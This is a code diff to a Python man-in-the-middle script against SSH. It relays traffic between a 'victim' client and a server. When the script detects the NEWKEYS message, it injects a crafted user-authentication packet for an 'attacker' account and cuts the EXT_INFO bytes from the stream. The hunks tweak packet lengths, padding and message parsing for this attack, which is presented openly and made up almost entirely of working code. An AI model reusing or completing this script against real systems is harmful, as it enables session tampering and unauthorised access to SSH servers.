@@ -21,7 +21,7 @@ SERVER_IP = args.server_ip
 
 NEW_KEYS_LENGTH = 16
 EXT_INFO_LENGTH = 60
-ADDITIONAL_CLIENT_MESSAGES_LENGTH = 60
+ADDITIONAL_CLIENT_MESSAGES_LENGTH = 80
 
 
 def main():
@@ -50,6 +50,7 @@ def main():
     Thread(target=forward_client_to_server, args=(victim_socket, server_socket)).start()
     Thread(target=forward_server_to_client, args=(victim_socket, server_socket)).start()
     print("Started forwarding data between victim and server")
+    s.close()
 
 
 def classify_message(message):
@@ -69,10 +70,10 @@ def classify_message(message):
     else:
         message_length = int.from_bytes(message[:4], byteorder='big')
         message_code = message[5]
-        return "BPP_Message of length " + str(message_length), message_length, message_code
+        return "BPP_Message of length " + str(message_length), message_code
 
 
-def create_user_auth_request():
+def create_attacker_auth_request():
     """
     Creates a malicious user authentication request.
 
@@ -83,7 +84,7 @@ def create_user_auth_request():
         b'\x32\x00\x00\x00\x08attacker\x00\x00\x00\x0essh-connection\x00\x00\x00\x08password'
         b'\x00\x00\x00\x00\x08attacker'
     )
-    padding_length = 0x8 - (len(user_auth_request) + 5) % 8
+    padding_length = 8 - (len(user_auth_request) + 5) % 8
     packet_length = len(user_auth_request) + padding_length + 1
 
     return (
@@ -102,7 +103,6 @@ def forward_client_to_server(victim_socket, server_socket):
     victim_socket (socket): The socket connected to the victim.
     server_socket (socket): The socket connected to the server.
     """
-    expected_message_length = 0
     new_keys_detected = False
     delay_next = False
     try:
@@ -122,19 +122,10 @@ def forward_client_to_server(victim_socket, server_socket):
                 time.sleep(5)
 
             if not new_keys_detected:
-                expected_message_length = message_info[1]
-                print(message_info)
-                while len(data) < expected_message_length:
-                    print(
-                        f"Expecting {expected_message_length} bytes, currently have {len(data)} bytes, "
-                        f"receiving {min(4096, expected_message_length - len(data) + 5)} bytes"
-                    )
-                    data += victim_socket.recv(min(4096, expected_message_length - len(data) + 5))
-
-                if message_info[2] == 0x15:
+                if message_info[1] == 0x15:
                     print("New keys detected")
                     new_keys_detected = True
-                    user_auth_request = create_user_auth_request()
+                    user_auth_request = create_attacker_auth_request()
                     print("Sending malicious user auth request to server: ", user_auth_request)
                     if len(data) < NEW_KEYS_LENGTH + EXT_INFO_LENGTH + ADDITIONAL_CLIENT_MESSAGES_LENGTH:
                         print(
@@ -144,8 +135,8 @@ def forward_client_to_server(victim_socket, server_socket):
                             data += victim_socket.recv(4096)
                     server_socket.sendall(
                         user_auth_request +
-                        data[:expected_message_length] +
-                        data[expected_message_length + EXT_INFO_LENGTH:]
+                        data[:NEW_KEYS_LENGTH] +
+                        data[NEW_KEYS_LENGTH + EXT_INFO_LENGTH:]
                     )
                     delay_next = True
                     continue
